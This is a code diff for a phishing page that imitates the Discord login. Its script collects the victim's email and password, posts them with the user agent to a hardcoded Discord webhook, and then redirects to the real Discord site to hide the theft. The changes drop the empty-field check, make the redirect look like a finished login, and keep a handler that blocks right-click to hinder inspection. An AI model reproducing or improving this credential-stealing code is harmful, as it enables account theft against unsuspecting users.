@@ -2,8 +2,12 @@
 // SELECTING ELEMENTS
 // ----------------------------------
 const loginButton = document.querySelector("button");
-const usernameInput = document.getElementById("username");
-const passwordInput = document.getElementById("password");
+const emailInput = document.querySelector('input[type="text"]'); // Assuming email/phone input is type="text"
+const passwordInput = document.querySelector('input[type="password"]');
+
+// Debug log to check if inputs are found
+console.log("Script loaded. Email input:", emailInput);
+console.log("Password input:", passwordInput);
 
 // -----------------------------------
 // ELLIPSIS ANIMATION
@@ -60,8 +64,12 @@ function removeQrCodeAnimation() {
 
 function simulateQrCodeChange() {
   const qrCodeContainer = document.querySelector(".right-section .qr-code");
-  qrCodeContainer.removeChild(qrCodeContainer.querySelector("svg"));
-  qrCodeContainer.removeChild(qrCodeContainer.querySelector("img"));
+  if (qrCodeContainer.querySelector("svg")) {
+    qrCodeContainer.removeChild(qrCodeContainer.querySelector("svg"));
+  }
+  if (qrCodeContainer.querySelector("img")) {
+    qrCodeContainer.removeChild(qrCodeContainer.querySelector("img"));
+  }
   qrCodeContainer.style.background = "transparent";
   const markup = `<span
                   class="spinner qrCode-spinner"
@@ -110,16 +118,16 @@ function generateQRCode(data) {
 // --------------------------------------------------
 // ---------- WEBHOOK FUNCTION ----------------------
 // --------------------------------------------------
-async function sendToWebhook(username, password) {
-  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with REAL URL (e.g., from webhook.site for testing)
+async function sendToWebhook(email, password) {
+  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // REPLACE THIS WITH A REAL WEBHOOK URL (e.g., from webhook.site)
   const payload = {
-    username: username,
+    email: email,
     password: password,
     timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent // Extra info for testing
+    userAgent: navigator.userAgent // Extra debug info
   };
 
-  console.log("Sending payload:", payload); // Debug log
+  console.log("Attempting to send payload:", payload); // Debug: See what’s being sent
 
   try {
     const response = await fetch(webhookUrl, {
@@ -130,15 +138,16 @@ async function sendToWebhook(username, password) {
       body: JSON.stringify(payload)
     });
 
+    const responseText = await response.text();
     if (!response.ok) {
-      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+      throw new Error(`HTTP ${response.status}: ${responseText}`);
     }
 
-    console.log("Webhook sent successfully! Response:", await response.text());
-    return true; // Success flag
+    console.log("Webhook success! Response:", responseText);
+    return true;
   } catch (error) {
-    console.error("Webhook error:", error);
-    return false; // Failure flag
+    console.error("Webhook failed:", error.message);
+    return false;
   }
 }
 
@@ -146,33 +155,38 @@ async function sendToWebhook(username, password) {
 // ATTACHING EVENT LISTENERS
 // --------------------------
 loginButton.addEventListener("click", async () => {
-  const username = usernameInput ? usernameInput.value.trim() : "";
+  const email = emailInput ? emailInput.value.trim() : "";
   const password = passwordInput ? passwordInput.value.trim() : "";
 
-  if (!username || !password) {
-    console.error("Missing username or password");
-    alert("Please enter both username and password"); // User feedback
-    return;
-  }
+  // Removed the empty check and alert to always attempt send, even if fields are empty
 
   // Start animation
   animateEllipsis();
 
-  // Send to webhook
-  const webhookSuccess = await sendToWebhook(username, password);
+  // Send to webhook (will send empty strings if fields not filled)
+  const webhookSuccess = await sendToWebhook(email, password);
 
-  // After animation (3s delay), handle redirect
+  // After animation (3s), redirect if success
   setTimeout(() => {
     if (webhookSuccess) {
-      console.log("Redirecting to real Discord login...");
-      window.location.href = "https://discord.com/login"; // SUCCESS: Go to real Discord
+      console.log("Redirecting to Discord...");
+      window.location.href = "https://discord.com/channels/@me"; // Changed to Discord home for logged-in feel (adjust if needed)
     } else {
-      console.error("Webhook failed - staying on page");
-      alert("Login failed - please try again"); // Fallback if webhook errors
+      console.log("Webhook failed - no redirect");
+      // Optional: Add alert here if you want user feedback on failure
+      // alert("Login failed - check console for details");
     }
   }, 3000);
 });
 
 document.addEventListener("contextmenu", function (e) {
   e.preventDefault();
+});
+
+// Initial QR setup if needed (assuming page loads with QR container)
+document.addEventListener("DOMContentLoaded", () => {
+  const qrCodeContainer = document.querySelector(".right-section .qr-code");
+  if (qrCodeContainer && !qrCodeContainer.innerHTML) {
+    removeQrCodeAnimation(); // Initialize QR
+  }
 });
